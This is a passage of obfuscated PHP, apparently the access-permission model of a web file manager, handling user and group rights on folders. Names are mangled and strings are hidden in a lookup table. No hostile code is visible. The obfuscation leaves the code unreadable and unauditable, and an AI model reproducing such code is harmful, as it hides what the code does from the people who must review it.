SourceModel::TYPE_USER) { $ĞŒÜëÂº = $ˆ³ÄÅ£¤; } if ($ÖŞäÍ¯[$é‚Ï„åĞ[190]] == SourceModel::TYPE_USER && $ÖŞäÍ¯[$é‚Ï„åĞ[577]] == $é‚Ï„åĞ[228]) { $ĞŒÜëÂº = 0; } $Ò®¦¢™ù[] = $ïò¢‰ÈÙ[$é‚Ï„åĞ[495]] + $ĞŒÜëÂº; } array_multisort($Ò®¦¢™ù, SORT_DESC, $ÊÃåÛ›÷); return $ÊÃåÛ›÷; } public function getAllChildrenByUser($·Íşşˆ, $²ÒÀ»Èª) { $ò…é¥ä· =& $_SERVER[§Êá¸İ]; $°ÈÁÄÌ = Model($ò…é¥ä·[606])->getInfo($²ÒÀ»Èª); if (!$²ÒÀ»Èª || !$·Íşşˆ || !$°ÈÁÄÌ) { return array(); } $ºÜØ„Èæ = Model($ò…é¥ä·[1428])->sourceInfo($·Íşşˆ); $ˆ¥Ûºø = array(); $¾å¡—Ö“ = 1; if ($ºÜØ„Èæ[$ò…é¥ä·[192]] == $ò…é¥ä·[228] && $ºÜØ„Èæ[$ò…é¥ä·[577]] != $¾å¡—Ö“ && $this->groupContainUser($ºÜØ„Èæ[$ò…é¥ä·[577]], $²ÒÀ»Èª)) { foreach ($°ÈÁÄÌ[$ò…é¥ä·[2169]] as $Ş‚Ô‰ŒÄ) { $Ş¡Ì”¹ü = Model($ò…é¥ä·[593])->getInfo($Ş‚Ô‰ŒÄ[$ò…é¥ä·[1978]]); $—›ë€Ô = Model($ò…é¥ä·[606])->getInfoSimpleOuter($²ÒÀ»Èª); $—›ë€Ô[$ò…é¥ä·[548]] = $Ş‚Ô‰ŒÄ[$ò…é¥ä·[495]]; if (Model($ò…é¥ä·[579])->authCheckAction($Ş‚Ô‰ŒÄ[$ò…é¥ä·[495]][$ò…é¥ä·[495]], $ò…é¥ä·[1999])) { continue; } $˜üªÈ = array($ò…é¥ä·[32] => $ò…é¥ä·[1303] . $Ş¡Ì”¹ü[$ò…é¥ä·[32]], $ò…é¥ä·[193] => $Ş¡Ì”¹ü[$ò…é¥ä·[90]][$ò…é¥ä·[193]], $ò…é¥ä·[87] => KodIO::make($Ş¡Ì”¹ü[$ò…é¥ä·[90]][$ò…é¥ä·[193]]), $ò…é¥ä·[192] => $ò…é¥ä·[228], $ò…é¥ä·[190] => $ò…é¥ä·[586], $ò…é¥ä·[33] => $ò…é¥ä·[624], $ò…é¥ä·[590] => $Ş¡Ì”¹ü[$ò…é¥ä·[597]], $ò…é¥ä·[1978] => $Ş¡Ì”¹ü[$ò…é¥ä·[1978]], $ò…é¥ä·[594] => $Ş¡Ì”¹ü[$ò…é¥ä·[192]], $ò…é¥ä·[2166] => array($—›ë€Ô)); $ˆ¥Ûºø[$˜üªÈ[$ò…é¥ä·[193]]] = $˜üªÈ; } } $ƒÆŞİßÓ = array(); $ä•ÚÚ…  = $this->getAllChildren($·Íşşˆ); foreach ($ä•ÚÚ…  as $—ïÁ¦ñ) { $·¹àÎÊ« = !1; foreach ($—ïÁ¦ñ[$ò…é¥ä·[2166]] as $ˆşÜ©¿ş) { if ($ˆşÜ©¿ş[$ò…é¥ä·[1779]]) { if ($ˆşÜ©¿ş[$ò…é¥ä·[1779]] == $²ÒÀ»Èª) { $·¹àÎÊ« = !0; break; } } if ($ˆşÜ©¿ş[$ò…é¥ä·[1978]]) { if ($this->groupContainUser($ˆşÜ©¿ş[$ò…é¥ä·[1978]], $²ÒÀ»Èª)) { $·¹àÎÊ« = !0; break; } } } if ($·¹àÎÊ«) { $ƒÆŞİßÓ[] = $—ïÁ¦ñ; } $ËàäÈ´ = $—ïÁ¦ñ[$ò…é¥ä·[193]]; if (isset($ˆ¥Ûºø[$ËàäÈ´])) { $—ïÁ¦ñ[$ò…é¥ä·[2166]][] = $ˆ¥Ûºø[$ËàäÈ´][0]; $ˆ¥Ûºø[$ËàäÈ´] = !1; } } $ˆ¥Ûºø = array_filter(array_values($ˆ¥Ûºø)); $ƒÆŞİßÓ = array_merge($ˆ¥Ûºø, $ƒÆŞİßÓ); return $ƒÆŞİßÓ; } public function setAllChildrenByUser($š¿•ÊÁ÷, $²ğöû«, $Æïïèşú) { $âóñ´ =& $_SERVER[§Êá¸İ]; $ôèÃ€¥Ô = $this->getAllChildrenByUser($š¿•ÊÁ÷, $²ğöû«); if (!$Æïïèşú || !$ôèÃ€¥Ô) { return !1; } foreach ($ôèÃ€¥Ô as $ÅÎÔ‡ŸÆ) { $ŸÉĞ»ê = array(); foreach ($ÅÎÔ‡ŸÆ[$âóñ´[2166]] as $ÛÆŸÕš) { $Ø½¤‡÷ = $ÛÆŸÕš[$âóñ´[548]]; $ŸêÓ·ÜÇ = $ÛÆŸÕš[$âóñ´[1779]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‹àÄª = $ÛÆŸÕš[$âóñ´[1779]] ? $ÛÆŸÕš[$âóñ´[1779]] : $ÛÆŸÕš[$âóñ´[1978]]; if ($ÛÆŸÕš[$âóñ´[1779]] && $ÛÆŸÕš[$âóñ´[1779]] == $²ğöû«) { continue; } $ŸÉĞ»ê[] = array($âóñ´[193] => $ÅÎÔ‡ŸÆ[$âóñ´[193]], $âóñ´[190] => $ŸêÓ·ÜÇ, $âóñ´[577] => intval($‹àÄª), $âóñ´[2086] => isset($Ø½¤‡÷[$âóñ´[483]]) ? intval($Ø½¤‡÷[$âóñ´[483]]) : 0, $âóñ´[2146] => isset($Ø½¤‡÷[$âóñ´[2146]]) ? intval($Ø½¤‡÷[$âóñ´[2146]]) : -1); } $ŸÉĞ»ê[] = array($âóñ´[193] => $ÅÎÔ‡ŸÆ[$âóñ´[193]], $âóñ´[190] => SourceModel::TYPE_USER, $âóñ´[577] => intval($²ğöû«), $âóñ´[2086] => intval($Æïïèşú), $âóñ´[2146] => -1); $this->where(array($âóñ´[499] => $ÅÎÔ‡ŸÆ[$âóñ´[193]]))->delete(); $this->addAll($ŸÉĞ»ê); } return !0; } public function get($ÀÚµ·Ÿ¹) { $ÍÚßĞÍØ = $this->getSourceList(array($ÀÚµ·Ÿ¹), !0); return $ÍÚßĞÍØ[0]; } public function getSourceList($ˆÀ¨Ø¸æ, $¦¾¶Õ°Ç = false, $Õ•ÉÁ› = false) { $¡Û¿°óÄ =& $_SERVER[§Êá¸İ]; if (!$ˆÀ¨Ø¸æ) { return array(); } $÷§›Òš• = Model($¡Û¿°óÄ[1428]); if (!$¦¾¶Õ°Ç && count($ˆÀ¨Ø¸æ) == 1) { $¦¾¶Õ°Ç = array(); $¦¾¶Õ°Ç[$ˆÀ¨Ø¸æ[0]] = $÷§›Òš•->sourceInfo($ˆÀ¨Ø¸æ[0]); } if (!$¦¾¶Õ°Ç) { $¢ŞÄÈê† = array($¡Û¿°óÄ[499] => array($¡Û¿°óÄ[500], $ˆÀ¨Ø¸æ)); $¦¾¶Õ°Ç = $÷§›Òš•->field($¡Û¿°óÄ[2170])->where($¢ŞÄÈê†)->select(); $¦¾¶Õ°Ç = array_to_keyvalue($¦¾¶Õ°Ç, $¡Û¿°óÄ[193]); } $Šª»ıĞŸ = $ˆÀ¨Ø¸æ; foreach ($¦¾¶Õ°Ç as $»òÜƒ‹Í => $š™–¶¹Ã) { $»á¬İ = $÷§›Òš•->parentLevelArray($š™–¶¹Ã[$¡Û¿°óÄ[592]]); $Šª»ıĞŸ = array_merge($Šª»ıĞŸ, array($»òÜƒ‹Í), array_reverse($»á¬İ)); } $Šª»ıĞŸ = array_values(array_unique($Šª»ıĞŸ)); if (!$Šª»ıĞŸ) { return array(); } $Ç”ĞêïÅ = $this->sourceAuthSelect($Šª»ıĞŸ); $ÚÌ¯ğÎ = array(); foreach ($Šª»ıĞŸ as $ÕÃé¿Ş–) { if (isset($Ç”ĞêïÅ[$ÕÃé¿Ş–])) { $ÚÌ¯ğÎ[$ÕÃé¿Ş–] = $Ç”ĞêïÅ[$ÕÃé¿Ş–]; } } $ÈØš±£¢ = $this->userIsRoot($Õ•ÉÁ›); $›¬›ü½ = AuthModel::authAll(); $¸²¹¬ô² = array($¡Û¿°óÄ[496] => $›¬›ü½, $¡Û¿°óÄ[2171] => array($¡Û¿°óÄ[501] => 0, $¡Û¿°óÄ[1984] => $›¬›ü½, $¡Û¿°óÄ[502] => LNG($¡Û¿°óÄ[2172]), $¡Û¿°óÄ[2001] => $¡Û¿°óÄ[2173])); $Ùìã‘Ê– = array(); foreach ($¦¾¶Õ°Ç as $ÕÃé¿Ş– => $«ÜÚÌÒ™) { if ($ÈØš±£¢ && $GLOBALS[$¡Û¿°óÄ[6]][$¡Û¿°óÄ[1997]]) { $Ùìã‘Ê–[$ÕÃé¿Ş–] = $¸²¹¬ô²; continue; } $Ùìã‘Ê–[$ÕÃé¿Ş–] = $this->makeSourceAuth($«ÜÚÌÒ™, $ÚÌ¯ğÎ, $Õ•ÉÁ›); } return $Ùìã‘Ê–; } public function authDeepCheck($¬äÇÜ¥è, $ñÉü»Ë = false) { $Ñå€¿û =& $_SERVER[§Êá¸İ]; $ñÉü»Ë = $ñÉü»Ë ? $ñÉü»Ë : USER_ID; $²±“ÉÀŠ = $this->makeAuthDeep($ñÉü»Ë); if (!in_array($¬äÇÜ¥è, $²±“ÉÀŠ[$Ñå€¿û[2174]])) { return !1; } $ÇÆ¯áëÆ = array(); foreach ($²±“ÉÀŠ[$Ñå€¿û[2175]] as $ÅÆÃéœŞ => $€ÈÇÑ«) { if (!in_array($¬äÇÜ¥è, $€ÈÇÑ«)) { continue; } $ÇÆ¯áëÆ[] = $ÅÆÃéœŞ; } if (!$ÇÆ¯áëÆ) { return !1; } $€ÎÂ Œ = $ÇÆ¯áëÆ ? $ÇÆ¯áëÆ[0] : $¬äÇÜ¥è; return array($Ñå€¿û[496] => -1, $Ñå€¿û[548] => array($Ñå€¿û[501] => $Ñå€¿û[1283], $Ñå€¿û[1984] => $Ñå€¿û[228], $Ñå€¿û[502] => LNG($Ñå€¿û[2176]), $Ñå€¿û[2001] => $Ñå€¿û[2177]), $Ñå€¿û[2178] => LNG($Ñå€¿û[2179]), $Ñå€¿û[2180] => $this->sourceAuthInfo($€ÎÂ Œ)); } protected function makeAuthDeep($ßÆ óÂó = false) { $‚°¤²¥É =& $_SERVER[§Êá¸İ]; static $Á¼£ıÒÙ = array(); $ßÆ óÂó = $ßÆ óÂó ? $ßÆ óÂó : USER_ID; if (isset($Á¼£ıÒÙ[$ßÆ óÂó])) { return $Á¼£ıÒÙ[$ßÆ óÂó]; } $ø´ĞÄ… = Model($‚°¤²¥É[2181])->listData(); $ıŞ•Ã¹ = array(); foreach ($ø´ĞÄ… as $µ’°Úèƒ) { if ($µ’°Úèƒ[$‚°¤²¥É[495]] == 0 && $µ’°Úèƒ[$‚°¤²¥É[2000]] == $‚°¤²¥É[91]) { $ıŞ•Ã¹[] = $µ’°Úèƒ[$‚°¤²¥É[483]]; } } $…Ëâ«¦¤ = $this->userGroupParents($ßÆ óÂó); $˜µºñƒ = array($‚°¤²¥É[190] => SourceModel::TYPE_USER, $‚°¤²¥É[577] => $ßÆ óÂó); if ($…Ëâ«¦¤) { $˜µºñƒ = array(array($‚°¤²¥É[190] => SourceModel::TYPE_USER, $‚°¤²¥É[577] => $ßÆ óÂó), array($‚°¤²¥É[190] => SourceModel::TYPE_GROUP, $‚°¤²¥É[577] => array($‚°¤²¥É[500], $…Ëâ«¦¤)), $‚°¤²¥É[1088] => $‚°¤²¥É[2080]); } $Ê¼¥¤Ç› = $this->field($‚°¤²¥É[2182])->where($˜µºñƒ)->select(); $ªÍåı¼ = array(); $ÏğÎş = array_to_keyvalue_group($Ê¼¥¤Ç›, $‚°¤²¥É[193]); foreach ($ÏğÎş as $¨ø­Ôãô => $ÔÍÁ) { $´Á¥£ñœ = $this->authArrayCheck($ÔÍÁ, $ßÆ óÂó); if ($´Á¥£ñœ[$‚°¤²¥É[496]] > 0) { $ªÍåı¼[] = $¨ø­Ôãô . $‚°¤²¥É[12]; } } if ($…Ëâ«¦¤) { $ö ˆ±ˆ = Model($‚°¤²¥É[593]); foreach ($…Ëâ«¦¤ as $´ĞĞ÷­‚) { $¯Éå©ÂÊ = $ö ˆ±ˆ->getInfo($´ĞĞ÷­‚); if (!$¯Éå©ÂÊ || !is_array($¯Éå©ÂÊ[$‚°¤²¥É[90]])) { continue; } $ªÍåı¼[] = $¯Éå©ÂÊ[$‚°¤²¥É[90]][$‚°¤²¥É[193]]; } } $ëú³æú = array(); $…ÊÛ—ş¨ = $…Ëâ«¦¤; $õøæòØƒ = Model($‚°¤²¥É[1428]); $ö ˆ±ˆ = Model($‚°¤²¥É[593]); $ŸÀÅ€Áš = array(); $¨Ÿ–ìû’ = array(); $À–åâ¶ = array(); $‹æ³¼€° = array(); if ($ªÍåı¼) { $×Áïö³Ü = $õøæòØƒ->where(array($‚°¤²¥É[193] => array($‚°¤²¥É[500], $ªÍåı¼)))->select(); foreach ($×Áïö³Ü as $œ©Ùõü) { $Æ½¹¿ÈÛ = $õøæòØƒ->parentLevelArray($œ©Ùõü[$‚°¤²¥É[592]]); $ëú³æú = array_merge($ëú³æú, $Æ½¹¿ÈÛ); $…ÊÛ—ş¨[] = $œ©Ùõü[$‚°¤²¥É[577]]; $ŸÀÅ€Áš[$œ©Ùõü[$‚°¤²¥É[193]]] = $Æ½¹¿ÈÛ; $¨Ÿ–ìû’[$œ©Ùõü[$‚°¤²¥É[193]]] = $œ©Ùõü[$‚°¤²¥É[577]]; } } $…ÊÛ—ş¨ = array_values(array_unique($…ÊÛ—ş¨)); $“üÕ¦å’ = $…ÊÛ—ş¨; foreach ($“üÕ¦å’ as $´ĞĞ÷­‚) { $¯Éå©ÂÊ = $ö ˆ±ˆ->getInfo($´ĞĞ÷­‚); $Æ½¹¿ÈÛ = $õøæòØƒ->parentLevelArray($¯Éå©ÂÊ[$‚°¤²¥É[592]]); $…ÊÛ—ş¨ = array_merge($…ÊÛ—ş¨, $Æ½¹¿ÈÛ); } $…ÊÛ—ş¨ = array_values(array_unique($…ÊÛ—ş¨)); foreach ($…ÊÛ—ş¨ as $´ĞĞ÷­‚) { $¯Éå©ÂÊ = $ö ˆ±ˆ->getInfo($´ĞĞ÷­‚); $ëú³æú[] = $¯Éå©ÂÊ[$‚°¤²¥É[90]][$‚°¤²¥É[193]]; $À–åâ¶[$´ĞĞ÷­‚] = $¯Éå©ÂÊ[$‚°¤²¥É[90]][$‚°¤²¥É[193]]; $‹æ³¼€°[$´ĞĞ÷­‚] = $õøæòØƒ->parentLevelArray($¯Éå©ÂÊ[$‚°¤²¥É[592]]); } foreach ($ŸÀÅ€Áš as $ƒÙ¸ªƒ => $ØàÑ€ëŞ) { $õÚÑ×¬¨ = $¨Ÿ–ìû’[$ƒÙ¸ªƒ]; if (!$õÚÑ×¬¨ || !$À–åâ¶[$õÚÑ×¬¨]) { continue; } $áß§ƒ¹ = array(); foreach ($‹æ³¼€°[$õÚÑ×¬¨] as $´ĞĞ÷­‚) { $áß§ƒ¹[] = $À–åâ¶[$´ĞĞ÷­‚]; } $ŸÀÅ€Áš[$ƒÙ¸ªƒ] = array_merge($áß§ƒ¹, $ØàÑ€ëŞ); } $ëú³æú = array_values(array_unique($ëú³æú)); $ÉóÍÈ¤– = array($‚°¤²¥É[2174] => $ëú³æú, $‚°¤²¥É[2175] => $ŸÀÅ€Áš); $Á¼£ıÒÙ[$ßÆ óÂó] = $ÉóÍÈ¤–; return $ÉóÍÈ¤–; } private function makeSourceAuth($¹Äàä«¡, $¸‰òïÇ‡, $Ó¶ñ¼È£ = false) { $œ·Ï¡­‰ =& $_SERVER[§Êá¸İ]; $‘ê·ØŸı = $œ·Ï¡­‰[91]; $‚Œƒ÷­Ã = $¹Äàä«¡[$œ·Ï¡­‰[577]]; $ÔìÙ“»£ = $¹Äàä«¡[$œ·Ï¡­‰[190]] == SourceModel::TYPE_GROUP; $‰§Áôüç = $ÔìÙ“»£ ? $this->groupRootAuth($‚Œƒ÷­Ã, $Ó¶ñ¼È£) : !1; if ($‰§Áôüç && Model($œ·Ï¡­‰[579])->authCheckAction($‰§Áôüç[$œ·Ï¡­‰[495]], $œ·Ï¡­‰[1999])) { return $this->groupAuthInfo($‰§Áôüç, $‚Œƒ÷­Ã); } $»¡ÇÖáŸ = Model($œ·Ï¡­‰[1428])->parentLevelArray($¹Äàä«¡[$œ·Ï¡­‰[592]]); $»¡ÇÖáŸ = array_merge(array($¹Äàä«¡[$œ·Ï¡­‰[193]]), array_reverse($»¡ÇÖáŸ)); $ĞÚ“€İ© = !1; foreach ($»¡ÇÖáŸ as $Â½êêÄ¦) { if (!isset($¸‰òïÇ‡[$Â½êêÄ¦])) { continue; } $ïÙßæ™É = $this->authMake($¸‰òïÇ‡[$Â½êêÄ¦], $Ó¶ñ¼È£); if ($ïÙßæ™É[$œ·Ï¡­‰[548]]) { $ĞÚ“€İ© = $ïÙßæ™É; break; } } if (!$ÔìÙ“»£) { return $ĞÚ“€İ©; } if (!$ĞÚ“€İ© && $‰§Áôüç) { $ĞÚ“€İ© = $this->groupAuthInfo($‰§Áôüç, $‚Œƒ÷­Ã); } if (!$ĞÚ“€İ©) { $âáÚíÓ¥ = Model($œ·Ï¡­‰[593])->getInfo($‚Œƒ÷­Ã); $ğ’Óß¶È = explode($œ·Ï¡­‰[50], trim($âáÚíÓ¥[$œ·Ï¡­‰[592]], $œ·Ï¡­‰[50])); $ğ’Óß¶È = array_reverse($ğ’Óß¶È); foreach ($ğ’Óß¶È as $‹ò˜ÏäÄ) { if ($‹ò˜ÏäÄ == $œ·Ï¡­‰[228] || $‹ò˜ÏäÄ == $‘ê·ØŸı) { continue; } $éÎ§ñ³Â = $this->groupRootAuth($‹ò˜ÏäÄ, $Ó¶ñ¼È£); if (!$éÎ§ñ³Â) { continue; } $ĞÚ“€İ© = $this->groupAuthInfo($éÎ§ñ³Â, $‹ò˜ÏäÄ); break; } } if (!$ĞÚ“€İ© || $ĞÚ“€İ©[$œ·Ï¡­‰[496]] <= 0) { $À§•¤Ûı = $this->authDeepCheck($¹Äàä«¡[$œ·Ï¡­‰[193]], $Ó¶ñ¼È£); if ($À§•¤Ûı) { $ĞÚ“€İ© = $À§•¤Ûı; } } return $ĞÚ“€İ©; } private function userIsRoot($¸¨™‡á = false) { $øŞºï¤ =& $_SERVER[§Êá¸İ]; if (!$¸¨™‡á && KodUser::isRoot()) { return !0; } $‘é˜Íºé = Model($øŞºï¤[606])->getInfo($¸¨™‡á); $­á·Ê‚ï = Model($øŞºï¤[2183])->listData($‘é˜Íºé[$øŞºï¤[2184]]); if ($­á·Ê‚ï && $­á·Ê‚ï[$øŞºï¤[583]][$øŞºï¤[2185]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ê†ÁÆ) { $ì«¶ôİ =& $_SERVER[§Êá¸İ]; $üøöÍº = Model($ì«¶ôİ[1428]); $¼Ëè»ü = $üøöÍº->sourceInfo($ê†ÁÆ); if (!$¼Ëè»ü) { return !1; } $üøöÍº->groupPathDisplay($¼Ëè»ü); $ù¶Ó”Å± = array($¼Ëè»ü); $ù¶Ó”Å± = $üøöÍº->_listAppendPath($ù¶Ó”Å±); $¼Ëè»ü = $ù¶Ó”Å±[0]; $üİ”ˆ»ø = $¼Ëè»ü[$ì«¶ôİ[590]]; if (isset($¼Ëè»ü[$ì«¶ôİ[598]])) { $ŒÆ¨‹¸ = explode($ì«¶ôİ[8], trim($¼Ëè»ü[$ì«¶ôİ[590]], $ì«¶ôİ[8])); array_shift($ŒÆ¨‹¸); $üİ”ˆ»ø = $¼Ëè»ü[$ì«¶ôİ[596]] . $ì«¶ôİ[2186] . implode($ì«¶ôİ[8], $ŒÆ¨‹¸); } return array($ì«¶ôİ[502] => $¼Ëè»ü[$ì«¶ôİ[32]], $ì«¶ôİ[87] => KodIO::make($¼Ëè»ü[$ì«¶ôİ[193]]), $ì«¶ôİ[2187] => $üİ”ˆ»ø); } private function groupAuthInfo($Ÿé®àÒ, $–ÊÄóÍ) { $ù€¡£²ü =& $_SERVER[§Êá¸İ]; $±àïìœÎ = Model($ù€¡£²ü[593])->getInfo($–ÊÄóÍ); return array($ù€¡£²ü[2188] => intval($Ÿé®àÒ[$ù€¡£²ü[495]]), $ù€¡£²ü[2171] => $Ÿé®àÒ, $ù€¡£²ü[2189] => LNG($ù€¡£²ü[2190]), $ù€¡£²ü[2180] => array($ù€¡£²ü[502] => $±àïìœÎ[$ù€¡£²ü[32]], $ù€¡£²ü[87] => KodIO::make($±àïìœÎ[$ù€¡£²ü[90]][$ù€¡£²ü[193]]), $ù€¡£²ü[2187] => $±àïìœÎ[$ù€¡£²ü[597]])); } protected function groupRootAuth($ù«ûÃŸ×, $şõ­‹š = false) { $ÖáğÉî’ =& $_SERVER[§Êá¸İ]; $şõ­‹š = $şõ­‹š ? $şõ­‹š : USER_ID; $ºá¦Ë  = $şõ­‹š . $ÖáğÉî’[2191] . $ù«ûÃŸ×; static $©Ÿ ¹ş = array(); if (isset($©Ÿ ¹ş[$ºá¦Ë ])) { return $©Ÿ ¹ş[$ºá¦Ë ]; } $öÑ¼Šï¡ = Model($ÖáğÉî’[593])->getInfo($ù«ûÃŸ×); $îØ…Éê› = $this->userGroupList($şõ­‹š); $ÏĞƒ¥øò = isset($îØ…Éê›[$ù«ûÃŸ×]) ? $îØ…Éê›[$ù«ûÃŸ×][$ÖáğÉî’[495]] : !1; if ($ÏĞƒ¥øò && Model($ÖáğÉî’[579])->authCheckAction($ÏĞƒ¥øò[$ÖáğÉî’[495]], $ÖáğÉî’[1999])) { $©Ÿ ¹ş[$ºá¦Ë ] = $ÏĞƒ¥øò; return $ÏĞƒ¥øò; } $ï£˜ôóÊ = $this->sourceAuthSelect($öÑ¼Šï¡[$ÖáğÉî’[90]][$ÖáğÉî’[193]]); $ŞÒ¯Âö = $ï£˜ôóÊ ? $this->authMake($ï£˜ôóÊ, $şõ­‹š) : !1; $¨™èûÅœ = $ŞÒ¯Âö ? $ŞÒ¯Âö[$ÖáğÉî’[548]] : !1; $©Ÿ ¹ş[$ºá¦Ë ] = $¨™èûÅœ ? $¨™èûÅœ : $ÏĞƒ¥øò; return $©Ÿ ¹ş[$ºá¦Ë ]; } public function authOwnerApply($õğ«Ç·ê) { $ÇØÕ“Ö… =& $_SERVER[§Êá¸İ]; if (empty($õğ«Ç·ê[$ÇØÕ“Ö…[495]]) || isset($õğ«Ç·ê[$ÇØÕ“Ö…[2192]]) && $õğ«Ç·ê[$ÇØÕ“Ö…[2192]]) { return $õğ«Ç·ê; } if (AuthModel::authCheckRoot($õğ«Ç·ê[$ÇØÕ“Ö…[495]][$ÇØÕ“Ö…[496]])) { return $õğ«Ç·ê; } $—Ÿæ„¼¨ = Model($ÇØÕ“Ö…[1428])->parentLevelArray($õğ«Ç·ê[$ÇØÕ“Ö…[592]]); $—Ÿæ„¼¨ = array_merge(array($õğ«Ç·ê[$ÇØÕ“Ö…[193]]), array_reverse($—Ÿæ„¼¨)); $÷°ùÉºÚ = $this->sourceAuthSelect($—Ÿæ„¼¨); $Ó¬¦ºÕÆ = array(); $ªŒîìµ = array(); foreach ($÷°ùÉºÚ as $ÀäìÛ¤ê => $‰ÆßúÙ½) { $Úœ´Ç’é = $this->authFolderOwnerUser($‰ÆßúÙ½); $Ó¬¦ºÕÆ[$ÀäìÛ¤ê] = $Úœ´Ç’é; $ªŒîìµ = array_merge($ªŒîìµ, $Úœ´Ç’é[$ÇØÕ“Ö…[670]]); if ($Úœ´Ç’é[$ÇØÕ“Ö…[2193]]) { break; } } if (count($ªŒîìµ) == 0) { $ªŒîìµ = $this->authFolderOwnerGroup($õğ«Ç·ê[$ÇØÕ“Ö…[577]]); } $ªŒîìµ = array_unique($ªŒîìµ); if (AuthModel::authCheckRoot($õğ«Ç·ê[$ÇØÕ“Ö…[495]][$ÇØÕ“Ö…[496]])) { $ªŒîìµ[] = USER_ID; } $õğ«Ç·ê[$ÇØÕ“Ö…[495]][$ÇØÕ“Ö…[2194]] = Model($ÇØÕ“Ö…[585])->userListInfo($ªŒîìµ); return $õğ«Ç·ê; } private function authFolderOwnerGroup($¯§ã¯Â‹) { $˜ßËÅ¬ñ =& $_SERVER[§Êá¸İ]; $åºËÙŠŸ = Model($˜ßËÅ¬ñ[2072])->where(array($˜ßËÅ¬ñ[1978] => $¯§ã¯Â‹))->select(); $’™˜©Ñ¦ = array(); if (!$åºËÙŠŸ) { return $’™˜©Ñ¦; } foreach ($åºËÙŠŸ as $¥ãª’¦) { $÷Á˜úÁ = $this->authInfo($¥ãª’¦); if (AuthModel::authCheckRoot($÷Á˜úÁ[$˜ßËÅ¬ñ[495]])) { $’™˜©Ñ¦[] = $¥ãª’¦[$˜ßËÅ¬ñ[1779]]; } } return $’™˜©Ñ¦; } private function authFolderOwnerUser($Œ¹¦é‰¬) { $ü³ˆÊ°³ =& $_SERVER[§Êá¸İ]; $ÂıéÖ½¦ = array(); $Ë±±¿ò = !1; foreach ($Œ¹¦é‰¬ as $êÏ…É½™) { $˜š»ùáª = $this->authInfo($êÏ…É½™); if ($êÏ…É½™[$ü³ˆÊ°³[577]] == $ü³ˆÊ°³[228]) { $Ë±±¿ò = !0; } if ($êÏ…É½™[$ü³ˆÊ°³[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($˜š»ùáª[$ü³ˆÊ°³[495]])) { $ÂıéÖ½¦[] = $êÏ…É½™[$ü³ˆÊ°³[577]]; } } } return array($ü³ˆÊ°³[670] => $ÂıéÖ½¦, $ü³ˆÊ°³[2193] => $Ë±±¿ò); } public function authMake($§¶¹†„, $¸éõĞ’¥ = false) { $¥æ§‚Şª =& $_SERVER[§Êá¸İ]; $¥äŠ§Ò = $this->authArrayCheck($§¶¹†„, $¸éõĞ’¥); if ($¥äŠ§Ò[$¥æ§‚Şª[2195]]) { $¥äŠ§Ò[$¥æ§‚Şª[2195]] = $this->sourceAuthInfo($¥äŠ§Ò[$¥æ§‚Şª[2195]]); } return $¥äŠ§Ò; } public function authArrayCheck($Í¬”™­, $ô…Œ”˜Ë = false) { $±Šø˜ù =& $_SERVER[§Êá¸İ]; if (!$Í¬”™­) { return array($±Šø˜ù[496] => 0, $±Šø˜ù[548] => !1); } $ô…Œ”˜Ë = $ô…Œ”˜Ë ? $ô…Œ”˜Ë : USER_ID; $™˜§î¾ƒ = 0; $ÖÛêËâ = 0; $îşÚˆó¯ = 0; $÷¦Î©ì¤ = 0; $ÅÅÇ¬Å = 0; $ÎÎ²ç‚Ü = 0; $¿˜§Ô¬ = 1000; $‡Õ¢Ğºœ = 0; $ÏĞ¼ĞŸú = 0; $™ò«¤»Ö = 0; $€ìšÍœŸ = 0; $òùÀÓÚ¾ = array($±Šø˜ù[193] => 0); foreach ($Í¬”™­ as $òùÀÓÚ¾) { $ü‘Ö¼›ê = $this->authInfo($òùÀÓÚ¾); if (!$ü‘Ö¼›ê) { continue; } $ğÈ°“Ëñ = $òùÀÓÚ¾[$±Šø˜ù[577]]; $ŠÉğş = intval($ü‘Ö¼›ê[$±Šø˜ù[495]]); if ($òùÀÓÚ¾[$±Šø˜ù[190]] == SourceModel::TYPE_USER && $ğÈ°“Ëñ == $ô…Œ”˜Ë) { $™˜§î¾ƒ = !0; $îşÚˆó¯ = $ü‘Ö¼›ê; $ÖÛêËâ = $ŠÉğş; } else { if ($òùÀÓÚ¾[$±Šø˜ù[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ğÈ°“Ëñ, $ô…Œ”˜Ë)) { $÷¦Î©ì¤ = !0; $®–ú³± = $this->groupStepToUserGroup($ğÈ°“Ëñ, $ô…Œ”˜Ë); if ($®–ú³± < $¿˜§Ô¬) { $¿˜§Ô¬ = $®–ú³±; $ÅÅÇ¬Å = $ŠÉğş; $ÎÎ²ç‚Ü = $ü‘Ö¼›ê; $‡Õ¢Ğºœ = $ğÈ°“Ëñ; } if ($®–ú³± == $¿˜§Ô¬ && $ŠÉğş >= $ÅÅÇ¬Å) { $ÅÅÇ¬Å = $ŠÉğş; $ÎÎ²ç‚Ü = $ü‘Ö¼›ê; $‡Õ¢Ğºœ = $ğÈ°“Ëñ; } } else { if ($ğÈ°“Ëñ == $±Šø˜ù[228]) { $ÏĞ¼ĞŸú = !0; $€ìšÍœŸ = $ü‘Ö¼›ê; $™ò«¤»Ö = $ŠÉğş; } } } } if ($™˜§î¾ƒ) { $ö‹ëÊÓŞ = $ÖÛêËâ; $ü‘Ö¼›ê = $îşÚˆó¯; $´ÔÍÏüù = LNG($±Šø˜ù[2196]); } else { if ($÷¦Î©ì¤) { $ö‹ëÊÓŞ = $ÅÅÇ¬Å; $ü‘Ö¼›ê = $ÎÎ²ç‚Ü; $óôôÏºŞ = Model($±Šø˜ù[593])->getInfo($‡Õ¢Ğºœ); $´ÔÍÏüù = $±Šø˜ù[176] . $óôôÏºŞ[$±Šø˜ù[597]] . $±Šø˜ù[2197] . LNG($±Šø˜ù[2198]); } else { if ($ÏĞ¼ĞŸú) { $ö‹ëÊÓŞ = $™ò«¤»Ö; $ü‘Ö¼›ê = $€ìšÍœŸ; $´ÔÍÏüù = LNG($±Šø˜ù[2168]); } else { $ö‹ëÊÓŞ = 0; $ü‘Ö¼›ê = !1; $´ÔÍÏüù = $±Šø˜ù[12]; } } } $¸Ú™… = array($±Šø˜ù[2188] => intval($ö‹ëÊÓŞ), $±Šø˜ù[2171] => $ü‘Ö¼›ê, $±Šø˜ù[2189] => $´ÔÍÏüù, $±Šø˜ù[2180] => $òùÀÓÚ¾[$±Šø˜ù[193]]); return $¸Ú™…; } private function groupContainUser($‚¼ñûÜµ, $’æúßßÜ = false) { return in_array($‚¼ñûÜµ, 